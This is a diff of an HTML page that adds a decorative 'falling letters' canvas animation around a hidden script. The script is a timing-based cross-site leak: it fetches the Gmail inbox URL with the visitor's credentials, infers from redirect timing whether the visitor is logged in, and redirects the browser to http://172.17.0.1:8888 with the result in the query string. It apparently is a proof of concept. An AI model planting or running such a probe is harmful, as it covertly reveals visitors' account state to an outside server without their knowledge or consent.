@@ -1,34 +1,92 @@
-<script>
-    (async () => {
-        const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
-        async function isRedirect (url1) {
-            const startTime = performance.now();
-            const a = await fetch(url1, { 'mode': 'no-cors', credentials: 'include', cache: 'no-store' });
-            const endTime = performance.now();
-            const timeTaken = endTime - startTime;
-            await sleep(1000);
-            const performanceEntry = performance.getEntriesByName(url1)[0];
-            const reportedDuration = performanceEntry.duration;
-            console.log(`Time taken for ${url1} to load: ${timeTaken}`);
-            console.log(`Reported time taken for ${url1} to load: ${reportedDuration}`);
-            // console.log(performanceEntry);
-            if ( (timeTaken - reportedDuration) > 5 ) {
-                console.log(`${url1} is a redirect?`);
-                return true;
-            } else {
-                console.log(`${url1} is not a redirect`);
-                return false;
+<html>
+    <head>
+        <style>* {margin: 0; padding: 0}
+            body {background: #000;}
+            canvas {display: block;}</style>
+    </head>
+    <body>
+        <canvas>
+            
+        </canvas>
+        <script>
+            // Initialising the canvas
+            var canvas = document.querySelector('canvas'),
+                ctx = canvas.getContext('2d');
+
+            // Setting the width and height of the canvas
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+
+            // Setting up the letters
+            var letters = 'ABCDEFGHIJKLMNOPQRSTUVXYZABCDEFGHIJKLMNOPQRSTUVXYZABCDEFGHIJKLMNOPQRSTUVXYZABCDEFGHIJKLMNOPQRSTUVXYZABCDEFGHIJKLMNOPQRSTUVXYZABCDEFGHIJKLMNOPQRSTUVXYZ';
+            letters = letters.split('');
+
+            // Setting up the columns
+            var fontSize = 10,
+                columns = canvas.width / fontSize;
+
+            // Setting up the drops
+            var drops = [];
+            for (var i = 0; i < columns; i++) {
+            drops[i] = 1;
             }
-        }
-        const url1 = 'https://mail.google.com/mail/u/0/';
-        console.log('Starting test');
-        const r = await isRedirect(url1);
-        console.log('Finished test');
-        if(!window.location.hash) {
-        window.location = window.location + '#loaded';
-        window.location.reload();
-        }
-        console.log(`${r ? 'Gmail account is probably not logged in' : 'Gmail account is probably logged in'} -- based on redirect test`);
-        window.location = `${r ? 'http://172.17.0.1:8888?logged_in' : 'http://172.17.0.1:8888?not_logged in'}`;
-    })();
-</script>
+
+            // Setting up the draw function
+            function draw() {
+            ctx.fillStyle = 'rgba(0, 0, 0, .1)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            for (var i = 0; i < drops.length; i++) {
+                var text = letters[Math.floor(Math.random() * letters.length)];
+                ctx.fillStyle = '#0f0';
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                drops[i]++;
+                if (drops[i] * fontSize > canvas.height && Math.random() > .95) {
+                drops[i] = 0;
+                }
+            }
+            }
+
+            // Loop the animation
+            setInterval(draw, 33);
+        </script>
+        <script>
+            (async () => {
+                const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+                async function isRedirect (url1) {
+                    const startTime = performance.now();
+                    const a = await fetch(url1, { 'mode': 'no-cors', credentials: 'include', cache: 'no-store' });
+                    const endTime = performance.now();
+                    const timeTaken = endTime - startTime;
+                    await sleep(1000);
+                    const performanceEntry = performance.getEntriesByName(url1)[0];
+                    const reportedDuration = performanceEntry.duration;
+                    console.log(`Time taken for ${url1} to load: ${timeTaken}`);
+                    console.log(`Reported time taken for ${url1} to load: ${reportedDuration}`);
+                    // console.log(performanceEntry);
+                    if ( (timeTaken - reportedDuration) > 5) {
+                        console.log(`${url1} is a redirect?`);
+                        return true;
+                    } else {
+                        console.log(`${url1} is not a redirect`);
+                        return false;
+                    }
+                }
+                const url1 = 'https://mail.google.com/mail/u/0/';
+                console.log('Starting test');
+                const r = await isRedirect(url1);
+                console.log('Finished test');
+                if(!window.location.hash) {
+                window.location = window.location + '#loaded';
+                window.location.reload();
+                }
+                var status = `${r ? 'not_logged_in' : 'logged_in'}`
+                console.log(`${status} -- based on redirect test`);
+                if(window.location.hash!='#loaded') {
+                window.location = window.location + '#loaded';
+                window.location.reload();
+                }
+                window.location = `http://172.17.0.1:8888?${status}`;
+            })();
+        </script>
+    </body>
+</html>
